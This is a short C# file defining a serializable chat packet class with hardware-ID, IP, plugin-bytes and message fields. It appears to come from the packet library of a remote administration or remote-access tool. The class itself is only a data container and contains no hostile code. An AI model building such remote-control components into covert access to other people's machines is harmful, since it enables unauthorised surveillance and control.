using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class RemoteChatPacket : IPacket
    {
        public RemoteChatPacket(PacketType packetType) : base()
        {
            this.packetType = packetType;
        }

        public RemoteChatPacket(string msg) : base()
        {
            this.packetType = PacketType.CHAT_ON;
            this.msg = msg;
        }

        public string HWID { get; set; }
        public string baseIp { get; set; }
        public byte[] plugin { get; set; }
        public PacketType packetType { get; }
        public PacketState packetState { get; set; }
        public string status { get; set; }
        public string datePacketStatus { get; set; }
        public int packetSize { get; set; }

        public string msg { get; set; }
    }
}
